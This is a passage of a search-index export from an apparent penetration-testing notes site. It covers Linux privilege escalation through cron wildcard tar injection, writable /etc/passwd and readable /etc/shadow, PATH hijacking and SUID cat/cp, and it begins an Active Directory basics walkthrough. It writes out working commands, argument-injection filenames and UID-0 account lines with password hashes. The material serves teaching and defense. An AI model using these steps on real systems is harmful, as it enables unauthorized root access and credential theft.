in the command.</p> <p></p> <p>Since user3 owns the directory in question, we can write files to the directory without requiring elevated privileges. We begin by creating a simple shell script which sets the SUID bit on the <code>/bin/bash</code> binary and assign execution permissions.</p> <p></p> <p>Next we create the following two files which will server as our arguments when the tar utility indexes the directory. Here we want to ensure that when the checkpoint condition is satisfied, the utility executes our shell script.</p> <p><pre><code>touch /home/user3/Documents/--checkpoint=1\ntouch '/home/user3/Documents/--checkpoint-action=exec=sh privesc.sh'\n</code></pre> </p> <p>All we need to do now is to wait for Cron to run the job and execute the <code>/bin/bash</code> binary with the <code>-p</code> flag to get privilege escalation.</p> <p></p> <p></p>"},{"location":"notes/privesc_linux/crontab/#conclusion","title":"Conclusion","text":"<p>Cron jobs provide a simple vector for privilege escalation in Linux systems. When automating tasks, users and system administrators need to be cautious about how they go about configuring the cron jobs by ensuring that correct permissions are assigned to any script called by the job. Additionally, absolute paths to scripts and binaries should be employed to further minimize risks of exploitation. Finally, care should be taken to prevent situations where an argument injection vector may become a viable exploitation path by limiting the use of wildcard characters.</p>"},{"location":"notes/privesc_linux/crontab/#references","title":"References","text":"<ul> <li>Crontab Generator</li> <li>Crontab Guru</li> <li>Argument Injection Vectors</li> <li>GTFOArgs</li> </ul>"},{"location":"notes/privesc_linux/passwdshadow/","title":"Passwd/Shadow","text":""},{"location":"notes/privesc_linux/passwdshadow/#introduction-to-etcpasswd-and-etcshadow","title":"Introduction to /etc/passwd and /etc/shadow","text":"<p><code>/etc/passwd</code> is a Linux configuration file which stores user account information such as username, user ID, and group ID in plain-text. The <code>/etc/passwd</code> file is owned by the root user and has permissions which allow it to be readable by all users on the system. Note that it may only be modified by the root user or other users with <code>sudo</code> privileges.</p> <p></p> <p>In older Linux systems, password hashes were kept in the <code>/etc/passwd</code> file. This allowed any user on the system to be able to read the hashed passwords stored in the file. Modern Linux systems have moved away from this practice and utilize the <code>/etc/shadow</code> to provide  enhanced authentication mechanism by restricting access at the account level.</p> <p>The <code>/etc/shadow</code> stores encrypted user passwords and is only accessible to the root user and the shadow group. This prevents unauthorized users or malicious actors from extracting user password hashes which can then be cracked using various brute-force techniques.</p> <p></p>"},{"location":"notes/privesc_linux/passwdshadow/#understanding-etcpasswd-file-format","title":"Understanding /etc/passwd File Format","text":"<p>Let's take a look at the contents of a <code>/etc/passwd</code> file. Note that we are not a super user but are still able to read the contents due to the world-readable permissions imposed on the <code>/etc/passwd</code> file.</p> <p></p> <p>The <code>/etc/passwd</code> file contains one record per line for each user account with access to the system and contains seven colon-separated fields with the following syntax:</p> <p><pre><code>Username:Password:UID:GID:GECOS:Directory:Shell\n</code></pre> The fields are defined as follows:</p> <ol> <li>Username: This field contains the user's login name. The field is normally limited to a length between 1 and 32 characters and should not contain any capital letters.</li> <li>Password: In older Linux systems, this field stored the encrypted password hashes for the users with access to the system. Modern Linux systems replaced the password hashes with the character <code>x</code> which indicates that the encrypted password is stored in the <code>/etc/shadow</code> file. Note that this field can be left empty (ie: blank) to indicate that the respective user does not need a password to login.</li> <li>User ID (UID): This field contains an identifier number which is used by the operating system for internal purposes. The distribution of UIDs is listed below:</li> <li><code>UID 0</code> is reserved for the super user (ie: root).</li> <li><code>UID 1-99</code> are traditionally reserved for predefined users (sometimes called pseudo-users). These users are administrators who do not need total root powers, but who perform some administrator tasks which require elevated privileges.</li> <li><code>UID 100-999</code> are often reserved for system accounts and groups.</li> <li><code>UID 1000+</code> are used for user accounts.</li> <li>Group ID (GID): This field determines the primary group of the user. Linux permits a user to be part of more than one group. Additional groups a user is part of will be defined in the system group file which is accessible using the <code>groups &lt;username&gt;</code> command. The distribution of GIDs is listed below:</li> <li><code>GID 0</code> is reserved for the super user (ie: root).</li> <li><code>GID 1-99</code> are reserved for the system and application use.</li> <li><code>GID 100+</code> are allocated for the user group.</li> <li>GECOS: This field is typically used to record general information about the account or its user. Information such as a user's full name, address, phone number, etc. can be stored in this field. All values stored in this field are comma-separated. GECOS is considered an optional field and therefore is not required to be filed in.</li> <li>Directory: This field contains the path to the user's home directory in Linux. The value in this field is used to set the <code>HOME</code> environment variable.</li> <li>Shell: This field contains the path the user's default login shell. The value in this field is used to set the <code>SHELL</code> environment variable.</li> </ol> <p>Let's look at a practical example. We can break down the record for user3 to better understand the file format based on the information provided above.</p> <p><pre><code>user3:x:1002:1002:user3,,,:/home/user3:/bin/bash\n</code></pre> The entry above contains information related to user3:</p> <ul> <li>The encrypted password is stored in the /etc/shadow file as indicated by the character x in the password field. </li> <li>The user belongs to UID 1002 and GID 1002. </li> <li>The only value in the GECOS field is the username user3. </li> <li>The home directory for user3 is defined as /home/user3.</li> <li>The default login shell being /bin/bash.</li> </ul>"},{"location":"notes/privesc_linux/passwdshadow/#understanding-etcshadow-file-format","title":"Understanding /etc/shadow File Format","text":"<p>Similar to the <code>/etc/passwd</code> file, <code>/etc/shadow</code> contains one record per line for each user on the system. Each line contains nine colon-separated fields with the following syntax:</p> <p><pre><code>Username:Password:LastPassChange:MinPassAge:MaxPassAge:WarningPeriod:InactivityPeriod:ExpirationDate:Reserved\n</code></pre> The fields are defined as follows:</p> <ol> <li>Username: This field contains the user's login name. This field must contain a value with a valid account name which exists on the system.</li> <li> <p>Password: This field stores the salted and hashed password for the user. The password is stored in the form <code>$id$salt$hashed</code> where <code>$id</code> represents the cryptographic algorithm used during the hashing process and can have the following values:</p> <ol> <li><code>$1$</code> - MD5</li> <li><code>$2a$</code> - Blowfish</li> <li><code>$2y$</code> - Blowfish</li> <li><code>$5$</code> - SHA-256</li> <li><code>$6$</code> - SHA-512</li> </ol> <p>Note that this field can be empty, in which case no password is required from the user to authenticate. If the field contains the characters <code>*</code> or <code>!</code>, the user cannot use password authentication to log into the system.</p> </li> <li> <p>LastPassChange: The value of this field represents the last time the password was changed. The value is expressed as the number of days which counts up from Jan 1, 1970 (epoch date). A zero (<code>0</code>) in this field implies that the user must change their password the next time they log in to the system. An empty field means that the password ageing feature is disabled.</p> </li> <li>MinPassAge: The value stored in this field represents the minimum number of days the user will need to wait before they are allowed to change their password again. An empty value or a value of zero (<code>0</code>) disables this feature.</li> <li>MaxPassAge: The value in this field represents the number of days after which a user password change is required. An empty field disables the feature requiring maximum password age, password warning period, and password inactivity period.Note that if the maximum password age is set below the minimum password age, the user cannot change their password.</li> <li>WarningPeriod: The value in this field represents the number of days before the password expires during which the user is warned that the password must be changed. An empty  value or a value of zero (<code>0</code>) disables this feature.</li> <li>InactivityPeriod: The value in this field represents the number of days after a password has expired during which the password should still be accepted. Once the expiration period and password inactivity period has elapsed, no login is possible using the current password. An empty value disables the password inactivity period.</li> <li>ExpirationDate: The value in this field represents the date after which the account expires. The value is expressed as the number of days which counts up from the epoch date.Note that the value in this field refers to account expiration and not password expiration.</li> <li>Reserved: This field is reserved and unused.</li> </ol> <p>With this information in mind, let's look at a practical example. </p> <p><pre><code>user3:$6$/X1sAdOR$uA/H.A4A2TSP.VG6InA3lzsU1xev1sPyn9qiyuwD5p5GG9JUCZo3ww25qTsjLciORvimu2Yd0jfTaCxqhHI0h/:18323:0:99999:7:::\n</code></pre> The entry above contains information related to user3:</p> <ul> <li>The password was encrypted using SHA-512. </li> <li>The user password was last changed on 2nd of March, 2020 (18323).</li> <li>The administrator has assigned no minimum password age.</li> <li>The password must be changed every 99999 days.</li> <li>The user will receive a warning to change the password seven (7) days prior to the password expiration date.</li> <li>No password inactivity period and account expiration date has been set.</li> </ul>"},{"location":"notes/privesc_linux/passwdshadow/#exploiting-etcpasswd-file-for-privilege-escalation","title":"Exploiting /etc/passwd File for Privilege Escalation","text":"<p>The key to exploiting the <code>/etc/passwd</code> file for privilege escalation is to somehow be able to add a new user with root privileges to the file (or modify the password of an existing user like root). For this to happen as a low privileged user, we would need write permissions to the file itself or rely on other means such as abusing SUID system binaries to be able to modify the contents of file.</p> <p>As noted earlier, the <code>/etc/passwd</code> file is normally globally-readable and only the super user has permissions to write to it. Permissions are defined this way to prevent low privileged users and threat-actors from being able to add or modify accounts with root privileges. Now Suppose a system administrator inadvertently marks <code>/etc/passwd</code> with global write permissions. With the file marked as globally-writeable, any user can modify the contents and give themselves root permissions.</p> <p>If you remember from our discussion on the <code>/etc/passwd</code> file format, modern Linux systems do not store the encrypted password for a user in the <code>/etc/passwd</code> file. The character <code>x</code> is used instead to indicate that the encrypted password hash is stored in the <code>/etc/shadow</code> file. In order to maintain backwards compatibility with older Linux systems, however, modern Linux systems still permit users to authentication if the <code>/etc/passwd</code> file has the character <code>x</code> replaced with a password hash instead. There are multiple ways to generate password hashes, so let's have a look at a few examples below. </p>"},{"location":"notes/privesc_linux/passwdshadow/#openssl","title":"OpenSSL","text":"<p>OpenSSL comes pre-installed on most Linux distributions. The <code>passwd</code> command can be used to generate a new password hash with the following syntax:</p> <p><pre><code>openssl passwd -1 -salt [salt value] [password]\n</code></pre> </p>"},{"location":"notes/privesc_linux/passwdshadow/#mkpasswd","title":"mkpasswd","text":"<p>The <code>mkpasswd</code> command is an over-featured front end to the crypt(3) libc function and can be used to generate password hashes with the following syntax:</p> <p><pre><code>mkpasswd -m [encryption algorithm] [password] -S [salt value]\n</code></pre> </p>"},{"location":"notes/privesc_linux/passwdshadow/#python","title":"Python","text":"<p>Python comes preinstalled on most Linux distributions. Python's crypt module can be used to generate password hashes with the following syntax:</p> <p><pre><code>python3 -c 'import crypt; print(crypt.crypt([password], \"$1$[salt value]\"))'\n</code></pre> </p> <p>Warning</p> <p>Python's <code>crypt</code> module is deprecated and is slated to be removed in Python 3.13.</p> <p>Once the password hash has been generated using one of the above methods, we simply need to either append a new user to the <code>/etc/passwd</code> file with root privileges or modify the entry for the root user by replacing the character <code>x</code> with our generated password hash. Let's see this in action.</p> <p>Let's start by generating a password hash using OpenSSL.</p> <p></p> <p>Append the following line to the the <code>/etc/passwd file</code>:</p> <p><pre><code>testuser:$1$testuser$61VaLhqTLFOznqUAe/Erk1:0:0:testuser:/root:/bin/bash\n</code></pre> Note that with the above syntax, we are adding a new user named testuser with UID = 0 and GID = 0 (ie: root privileges). We can append the line using one of the several command line editors such as <code>nano</code> or <code>vi</code> however the most universal method would be to simply use the <code>echo</code> command. Also note that we will need to escape the <code>$</code> characters by using the <code>\\</code> escape character when using the <code>echo</code> command.</p> <p></p> <p>Now all that's left to do is to switch over to the new user using the password and an interactive shell to gain our root access.</p> <p></p> <p>As mentioned earlier, an alternative to adding a new user with root privileges is to simply replace the <code>x</code> character for the root user with our generated password hash. Mechanically, this works the same way.</p> <p></p> <p></p>"},{"location":"notes/privesc_linux/passwdshadow/#exploiting-etcshadow-file-for-privilege-escalation","title":"Exploiting /etc/shadow File for Privilege Escalation","text":"<p>The <code>/etc/shadow</code> is easily exploitable for privilege escalation if misconfigured. Recall that the <code>/etc/shadow</code> file has read permissions set for the root user and the shadow group with the root user having the sole permissions to write to the file.</p> <p>Let's look at an example where a system administrator has inadvertently provided global read permissions to the <code>/etc/shadow</code> file. As a result of this misconfiguration, we as a low privileged user are able to view the contents of the <code>/etc/shadow</code> file. Since the file contains the encrypted password hashes for each user with access to the system, we are able to use brute-forcing techniques to obtain user passwords. Note that this method relies on the users having weak passwords. Let's use John the Ripper to brute-force the root user's password hash.</p> <p>The process of using John the Ripper to extract passwords from the <code>/etc/shadow</code> file requires two basic steps. We first have to use a utility called <code>unshadow</code> to combine the contents of <code>/etc/passwd</code> file with the contents of <code>/etc/shadow</code> file. We begin by copying the line for the root user from the <code>/etc/passwd</code> file and the <code>/etc/shadow</code> file to files <code>passwd.txt</code> and <code>shadow.txt</code> respectively.</p> <p></p> <p></p> <p>We then use the <code>unshadow</code> utility, which comes packaged with John the Ripper, to combine the contents of the two files. The syntax is as follows:</p> <p><pre><code>unshadow [file with passwd content] [file with shadow content] &gt; [unshadowed file name]\n</code></pre> </p> <p>With the file now unshadowed, we can use John the Ripper to crack the root user's password hash.</p> <p></p> <p>We can now use these credentials to elevate to the root user.</p> <p></p> <p>Note that if a system administrator misconfigured the <code>/etc/shadow</code> file to be both globally-readable and writeable (or we are able to find and abuse SUID binaries owned by the root user which allows us to modify the file) the task of privilege escalation to the root user becomes trivial. Similar to how we were able to modify the <code>/etc/passwd</code> file with write permissions by replacing the <code>x</code> character with our generated password hash, we can do the same with the <code>/etc/shadow</code> file by replacing the existing password hash for the root user with our generated password hash. Once saved, we are then able to use the new root credentials to escalate our privileges.</p>"},{"location":"notes/privesc_linux/passwdshadow/#conclusion","title":"Conclusion","text":"<p>Improper file permissions can trivialise privilege escalation in Linux systems. As a system administration, one needs to be extremely careful when assigning permissions to ensure that sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> files are not given relaxed permissions for under privileged users. We saw how write permissions on the <code>/etc/passwd</code> file and read permissions on <code>/etc/shadow</code> file can be abused to gain super user privileges on a system. Although these misconfigured permissions are not common, it is still worth while as a penetration tester to quickly check the permissions on these files for easy an privilege escalation vector.</p>"},{"location":"notes/privesc_linux/pathvariable/","title":"PATH Variable","text":""},{"location":"notes/privesc_linux/pathvariable/#introduction","title":"Introduction","text":"<p>The PATH environmental variable is a colon-delimited list of directories that tells the shell which directories to search for executable when running a command. Say for example that you have two binaries that share the same name located in two different directories. If executed, the shell will run the file that is in the directory that comes first in the PATH variable. Use of the PATH variable means that we don't have to specify an absolute path to a binary when running a command. Consequently, a misconfigured PATH variable can result in an easy privilege escalation vector.</p> <p>We print the current value of PATH variable as follows:</p> <p><pre><code>echo $PATH\n\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games\n</code></pre> When a command is executed, the shell will traverse the colon-separated paths from left to right. In the above listed command, the shell will look for the <code>echo</code> binary in the <code>/usr/local/sbin</code> directory first before moving on to <code>/usr/local/bin</code> and so forth.</p> <p>We can add a new path to the PATH variable using the <code>export</code> command. To prepend a new path, we reassign our new PATH variable with our new desired path at the beginning of the existing PATH variable (indicated by <code>$PATH</code>).</p> <p><pre><code>export PATH=/new_path:$PATH\n</code></pre> To append a new path, the PATH variable is reassigned with the new path at the end.</p> <p><pre><code>export PATH=$PATH:/new_path\n</code></pre> Note that new paths added using the <code>export</code> command are non-persistent between shell sessions. When closing and opening a new shell session, the added path will be lost.</p>"},{"location":"notes/privesc_linux/pathvariable/#exploiting-path-variable","title":"Exploiting PATH Variable","text":"<p>Exploitation of the PATH variable to gain privilege escalation in Linux systems requires the following two conditions to be satisfied:</p> <ol> <li>Misconfigured PATH variable where a globally-writeable directory (or a directory which a low privileged user has write access to) has been prepended to the existing PATH variable.</li> <li>Missing absolute path in binaries and commands which can be exploited via the PATH variable.</li> </ol> <p>It should be noted that most exploits involving the PATH variable will inevitably require the use of SUID binaries, misconfigured cron job, or other misconfigured file permissions on the system.</p>"},{"location":"notes/privesc_linux/pathvariable/#exploiting-missing-absolute-paths-in-cron-jobs","title":"Exploiting Missing Absolute Paths in Cron Jobs","text":"<p>In this example, we will look at exploiting a situation where a system administrator has misconfigured the PATH variable by prepending a globally-writeable directory to the existing PATH variable. To make matters worse, the schedule task created by the system administrator does not use absolute paths for the binaries being called.</p> <p>By default, Cron runs as root when executing scheduled tasks. By redirecting Cron to a binary or script we control, we can escalate our privileges to those of the root user. Let's see this in action.</p> <p>We begin by looking at the contents of <code>/etc/crontab</code>.</p> <p></p> <p>Here we can see that the system administrator has prepended the globally-writeable <code>/tmp</code> directory to the PATH variable. Furthermore, the top scheduled task calls the <code>ps</code> binary without defining its absolute path. From above we know that if we call a duplicate file located in different folders, the Linux shell will execute the file that is in the directory that comes first in the PATH variable.</p> <p>Since the globally-writeable <code>/tmp</code> is the first path in the PATH variable, we can redirect Cron to execute our modified file instead of the actual one by creating a modified <code>ps</code> script in the <code>/tmp</code> folder with malicious code.</p> <p></p> <p>Here, we use the <code>echo</code> command to create a new <code>ps</code> script in the <code>/tmp</code> directory which sets the SUID bit on the <code>/bin/bash</code> binary. In order for Cron to be able to be execute our script, we need to mark it as executable.</p> <p></p> <p>With the executable permissions set, all we need to do is but wait for Cron to run the job which will execute our script to set the SUID bit on <code>/bin/bash</code>.</p> <p></p> <p>We can now execute the <code>/bin/bash</code> binary with the <code>-p</code> flag which does not reset the effective user id and allows the binary to be ran as the owner (ie: root in this case).</p> <p></p>"},{"location":"notes/privesc_linux/pathvariable/#exploiting-missing-absolute-paths-in-suid-binaries","title":"Exploiting Missing Absolute Paths in SUID Binaries","text":"<p>SUID are permissions that allow users to execute a binary with the permissions of its owner. Exploiting missing absolute paths in SUID binaries requires us to modify our local PATH variable to point the binary to a resource we control at runtime. This task isn't always trivial as discerning what might be going-on under the hood of the binary at runtime without source code is not as straightforward and requires a degree of reverse engineering and even trial and error.</p> <p>Let's see this in action. We begin off by searching the system for any files with the SUID (or 4000) permission using the <code>find</code> command.</p> <p><pre><code>$ find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre> </p> <p>In the list of the SUID binaries found above, we see a custom binary which is not part of the standard binaries included in Linux systems. Let's go ahead and execute the binary to see what it does.</p> <p></p> <p>Without access to the source code for the binary, we can't be certain about what functions the binary calls. Looking at the output, we can make an educated guess that when executed, the binary calls the <code>cat</code> function, which is a standard Linux binary, to print out the contents of the <code>/etc/passwd</code> file.</p> <p>To test our theory, we can use the <code>echo</code> command to create a new <code>cat</code> script in the <code>/tmp</code> directory which calls the <code>/bin/bash</code> binary. Remember to mark the script file as executable.</p> <p></p> <p>Now let's modify our local PATH variable using the <code>export</code> command to include the location of our script file.</p> <p></p> <p>Now execute the SUID binary. If our theory is correct, when executed, the binary will call our <code>cat</code> script file instead of the original binary located at <code>/bin/cat</code> thereby executing the <code>/bin/bash</code> binary with root privileges.</p> <p></p>"},{"location":"notes/privesc_linux/pathvariable/#conclusion","title":"Conclusion","text":"<p>Developers should take care to ensure that system commands and binaries are called in a secure manner. Missing absolute paths in binary calls together with a modified PATH variable can make privilege escalation trivial. The above two examples illustrate how we can abuse the PATH variable in situations where absolute paths are not clearly defined when executing binaries or commands.</p>"},{"location":"notes/privesc_linux/suid/","title":"SUID/SGID","text":""},{"location":"notes/privesc_linux/suid/#linux-file-permissions","title":"Linux File Permissions","text":"<p>File permissions are core to the security model used by Linux systems. Permissions determine who can access files and directories and the level of interaction users or group owners are permitted. Each file and directory in a Linux system has three user based permission groups as illustrated in the diagram below. </p> <p></p> <ol> <li>Owner: The owner permissions only apply to the owner of the file or the directory and do not impact the actions of other users.</li> <li>Group: The group permissions apply only to the group that has been assigned to the file or directory and do not impact the actions of other users.</li> <li>Other Users (Others): The other users permissions apply to all other users on the system who are not an owner of the file or directory or a group assigned to the file or directory. These users are typically low privilege users.</li> </ol> <p>Each file or directory has three basic permission types which can be assigned to each class of users:</p> <ol> <li>Read: Read permissions are indicated by \"r\" and refer to a user's ability to read the contents of a file or view the contents of a directory. Read permissions are required to make copies of a file as you need to access the file's contents in order to make a duplicate of it.</li> <li>Write: Write Permissions are indicated by \"w\" and refer to a user's ability to write or modify a file or the contents of a directory. Write permissions on a directory are required to move, remove, or otherwise modify content contained within it.</li> <li>Execute: Execute permissions are indicated by \"x\" and affect a user's ability to execute a file or access a directory.  </li> </ol> <p>Note that a \"-\" in any basic permission type field indicates that the respective user does not have the correct permissions to perform that particular action on the file or directory in question.</p> <p>We can view the assigned permissions for a file by using the <code>ls -l</code> command. The following image illustrates an example of file permissions as displayed in a Linux console.</p> <p></p>"},{"location":"notes/privesc_linux/suid/#modifying-file-permissions","title":"Modifying File Permissions","text":"<p>In Linux systems, file permissions can be modified by using the <code>chmod</code> command. Permissions in Linux can be assigned explicitly or by using binary references. Although we will be defining permissions explicitly, it is recommended to research and understand how binary references can be used for setting permissions on a file or a directory.</p> <p>When defining permissions explicitly, we need to reference the permissions groups and the permission types discussed above. The permission groups are abbreviated as follows:</p> <ul> <li>u - Owner</li> <li>g - Group</li> <li>o - Other Users</li> <li>a - All Users</li> </ul> <p>The permission groups can be combined with the three basic permission types using assignment operations <code>+</code> and <code>-</code> to either add or remove specific permissions. Let's look at an example. The original permissions for <code>file.txt</code> are presented below.</p> <p></p> <p>Say we wanted to grant write permissions to the group. We can do this by using the <code>chmod g+w file.txt</code> command.</p> <p></p> <p>Now say that we wanted to remove the read access from all other users as we don't want anyone but the owner and the group to be able to read the contents of our file. We can do this by using the <code>chmod o-r file.txt</code> command.</p> <p></p> <p>As you can see from the image above, the read permissions from other users have been removed.</p>"},{"location":"notes/privesc_linux/suid/#suidsgid","title":"SUID/SGID","text":"<p>SUID (Set User Identification) and SGID (Set Group Identification) are permissions that allow users to execute a binary or script with the permissions of its owner (SUID) or of its group (SGID). Some system binaries, have this permission by default as they are required to perform certain actions with elevated privileges. Improper assignment of SUID or SGID permissions on some key binaries can lead to privilege escalation vectors.</p> <p></p>"},{"location":"notes/privesc_linux/suid/#manually-finding-suid-binaries","title":"Manually Finding SUID Binaries","text":"<p>The following command can be used to identify binaries which have SUID permissions assigned to them:</p> <p><pre><code>$ find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre> Here:</p> <ul> <li><code>/</code> instructs the find command to start from the root of the file system and find every directory.</li> <li><code>-perm</code> denotes that we want to search for the permissions that follow.</li> <li><code>-u=s</code> denotes that we want to look for files that are owned by the root user.</li> <li><code>-type f</code> denotes that we are looking for a file type.</li> <li><code>2&gt;/dev/null</code> denotes that stderr are redirected to /dev/null.</li> </ul> <p>We can also use the following command which searches for files with permissions <code>-4000/-2000/-6000</code>.</p> <p><pre><code>$ find / -perm -4000 -o- -perm -2000 -o- -perm -6000\n</code></pre> Alternatively, we can use one of the following commands which search for all files with the SUID and SGID bit set.</p> <p><pre><code>find / -perm /u=s,g=s -type f -exec ls -la {} \\; 2&gt;/dev/null\n</code></pre> <pre><code>find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2&gt; /dev/null\n</code></pre></p> <p>Tip</p> <p>Alternatively, automated enumeration tools like LinPEAS and LinEnum can be utilized to find SUID binaries.</p>"},{"location":"notes/privesc_linux/suid/#exploiting-vulnerable-suid-binaries","title":"Exploiting Vulnerable SUID Binaries","text":"<p>Vulnerable system binaries with the SUID bit set are an easy vector for privilege escalation on Linux systems. These binaries can potentially be used to access and modify restricted files and even execute commands with root privileges.</p> <p>Let's look at two simple examples of exploiting vulnerable SUID binaries.</p>"},{"location":"notes/privesc_linux/suid/#example-1-cat-file-read","title":"Example 1 - cat (File Read)","text":"<p><code>cat</code> is a common Linux command used to concatenate files and print the contents on the standard output. Looking at the permissions for the cat binary, we see that the binary is owned by the root user who has full read, write, and execute permissions for the binary. A typical low privilege user only has execute permission set. This is typical for a properly configured Linux system.</p> <p></p> <p>Suppose a system administrator accidentally sets the SUID bit on the <code>/bin/cat</code> binary. This would permit any low privileged user to view contents of a file which they normally would not have permissions to access. One such file could be the <code>/etc/shadow</code>, which contains the encrypted passwords of all users with access on the system. Let's see this in action.</p> <p>We begin by confirming that the SUID bit is set on the <code>/bin/cat</code> binary.</p> <p></p> <p>Looking at the permissions for <code>/etc/shadow</code> we see that only the owner:root and group:shadow have permissions to read the contents of the file (note that only the root user has write permissions to the shadow file). </p> <p></p> <p>Normally a low privileged user should not be able to view the contents but since the SUID bit on the <code>/bin/cat</code> binary is set (and it is owned by the root user), we can execute it with root privileges; thus allowing a low privilege user to read the contents of the <code>/etc/shadow</code> file.</p> <p></p>"},{"location":"notes/privesc_linux/suid/#example-2-cp-file-write","title":"Example 2 - cp (File Write)","text":"<p><code>cp</code> is a Linux binary which permits users to copy files or directories. In a properly configured system, the <code>cp</code> binary has the following permissions.</p> <p></p> <p>Suppose during our enumeration, we discover that a system administrator has set the SUID bit on the <code>/bin/cp</code> binary. Having the ability to execute the <code>cp</code> command with the permissions of its owner (root) means that we are able to write data to files which low privilege users should not be authorized to. A prime candidate for writing data to would be the <code>/etc/passwd</code> file. The <code>/etc/passwd</code> file is used to keep track of every user that has access to a system.</p> <p>The <code>/etc/passwd</code> file is globally readable but only writeable by the owner of the file and the group assigned to the file.</p> <p></p> <p>We can leverage the fact that the SUID bit on <code>/bin/cp</code> is set to add a new line to the <code>/etc/passwd</code> file; effectively allowing us to add a new user to the system with root privileges or alternatively overwrite the password of an existing user. Let's put this into action .</p> <p>Start by confirming the permissions on the <code>/bin/cp</code> binary.</p> <p></p> <p>With the knowledge that the SUID bit is set, we can generate a new user password hash using <code>openssl</code> which typically comes installed with most Linux distributions.</p> <p></p> <p>We need to create a copy of the <code>/etc/passwd</code> file which we can modify to add the new user. A common directory to work out of is the <code>/tmp</code> directory as this directory typically has the least restrictive permissions.</p> <p></p> <p>We can now modify the copied file by appending the following line to the file.</p> <p><pre><code>newuser:$1$newuser$CrQin45KYNZnptM8rhDV/0:0:0:root:/root:/bin/bash\n</code></pre> The values of fields, in the order from left to right are:</p> <ol> <li><code>newuser</code>: Username</li> <li><code>$1$newuser$CrQin45KYNZnptM8rhDV/0</code>: Password hash for our user</li> <li><code>0</code>: UID denoting our user has root privileges</li> <li><code>0</code>: GID denoting our user belongs to the root group</li> <li><code>root</code>: GECOS field which describes the person or an account and is typically used for information only</li> <li><code>/root</code>: Path to the user's home directory</li> <li><code>/bin/bash</code>: Shell that is started every time our user logs in</li> </ol> <p>With our new user added, we can now replace the <code>/etc/passwd</code> file with our modified one. Normally this would not be possible due to lack of write permissions but since the SUID bit is set on the <code>/bin/cp</code> binary, we are able to copy the file over with root privileges.</p> <p></p> <p>We can confirm if the <code>passwd</code> file was successfully overwritten by reading the contents of the file.</p> <p></p> <p>Now all that is left for us to do is to log in as the new user with the following credentials: <code>newuser:pass123</code></p> <p></p>"},{"location":"notes/privesc_linux/suid/#conclusion","title":"Conclusion","text":"<p>SUID and SGID is a special type of permission which can be given to a file which allows the file to always run with permissions of the owner or the group instead of the user executing it. The above two examples illustrate two simple ways of how SUID binaries can be exploited to gain root access in a system. There are many more examples of how SUID binaries can be exploited. </p> <p>Tip</p> <p>A good resource on exploiting SUID binaries is GTFOBins. GTFOBins is a curated list of UNIX binaries that can be used to bypass local security restrictions in misconfigured systems.</p>"},{"location":"notes/privesc_linux/suid/#references","title":"References","text":"<ul> <li>GTFOBins</li> <li>Steflan Security</li> <li>Hacking Articles</li> </ul>"},{"location":"walkthroughs/thm/activedirectorybasics/","title":"Active Directory Basics","text":""},{"location":"walkthroughs/thm/activedirectorybasics/#introduction","title":"Introduction","text":"<p>Note</p> <p>Microsoft's Active Directory is the backbone of the corporate world. It simplifies the management of devices and users within a corporate environment. In this room, we'll take a deep dive into the essential components of Active Directory.</p> <p>This room will cover basic concepts related to Active Directory including the following topics:</p> <ul> <li>What is Active Directory?</li> <li>What is an Active Directory Domain?</li> <li>What components go into an Active Directory Domain?</li> <li>Forests and Domain Trust</li> </ul>"},{"location":"walkthroughs/thm/activedirectorybasics/#windows-domains","title":"Windows Domains","text":"<p>Windows domain is a group of users and computer under the administration of a given business. Windows domains provide network administrators with a way to manage a large number of endpoints and control them from one place. Windows domains are generally made up of computers on the same local network; however computers joined to a domain can continue communicating with their domain controller over VPN or Internet connection thus allowing remote access.</p> <p>In other words, the main idea behind a domain is to centralize the administration of common components of a Windows computer network in a single repository called Active Directory (AD). The server that runs the Active Directory services is known as a Domain Controller (DC).</p> <p>When a computer is joined to a domain, it does not use its own local user accounts. User accounts and passwords are managed on the domain controller. Logging into a computer on that domain, the computer authenticates your user account name and password with the domain controller. This means you can log in with the same username and password on any computer joined to the domain.</p> <p></p> <p>Some key advantages of having a configured Windows domain are:</p> <ul> <li>Centralized identity management: All users across the network can be configured from Active Directory with minimum effort.</li> <li>Managing security policies: Security policies can be configured directly from Active Directory and applied to users and computers across the network as needed.</li> </ul>"},{"location":"walkthroughs/thm/activedirectorybasics/#active-directory","title":"Active Directory","text":"<p>The core of any Windows domain is the Active Directory Domain Service (AD DS). This service holds all relevant information related to objects that exist on the network.</p>"},{"location":"walkthroughs/thm/activedirectorybasics/#users","title":"Users","text":"<p>Users are one of the most common object types in Active Directory. Users are one of the objects known as security principals which means that they can be authenticated by the domain and can be assigned privileges over resources like files or printers. In other words, a security principal is an object that can act upon resources in the network.</p> <p>Users can be represented by two types of entities:</p> <ul> <li>People: Users will generally represent persons in an organization that need access to the network (ie. employees).</li> <li>Services: You can also define users to be used by services like IIS or MSSQL. Every single service requires a user to run but service users are different from regular users as they will only have the privileges to run their specific service.</li> </ul>"},{"location":"walkthroughs/thm/activedirectorybasics/#machines","title":"Machines","text":"<p>Machines are another type of object within Active Directory. For every computer that joins the Active Directory domain, a machine object will be created. Machines are also considered security principals in much the same way as users and are assigned an account just as any regular user. These accounts have somewhat limited rights within the domain controller itself.</p> <p>The machine accounts themselves are local administrators on the assigned computer and are generally not supposed to be accessed by anyone except the computer itself. It should be noted that if you have the password to the machine account, you can use it to log in.</p> <p>Note: Machine account passwords are automatically rotated out and are generally comprised of 120 random characters.</p> <p>Machine accounts follow a specific naming scheme thus making them easy to identify. The machine account name is the computer's name followed by a dollar sign. For example, a machine named <code>DC01</code> will have a machine account called <code>DC01$</code>.</p>"},{"location":"walkthroughs/thm/activedirectorybasics/#security-groups","title":"Security Groups","text":"<p>Security groups are a way of collecting user accounts, machine accounts, and other groups into manageable units. Working with groups instead of with individual users helps simplify network administration since any account added to an existing group will automatically inherit all of the group's privileges. Security groups are also considered security principals and as such can have privileges over resources on the network.</p> <p>Groups can have both users and machines as members. If required, groups can include other groups as well. Several groups are created by default in a domain that can be used to grant specific privileges to the users. The following are some important groups in a domain:</p> Security Group Description Domain Admins Users of this group have administrative privileges over the entire domain. By default, they can administer any computer on the domain, including Domain Controllers. Server Operators Users in this group can administer Domain Controllers. They cannot change any administrative group memberships. Backup Operators Users in this group are allowed to access any file, ignoring their permissions. They are used to perform backups of data on computers. Account Operators Users in this group can create or modify other accounts in the 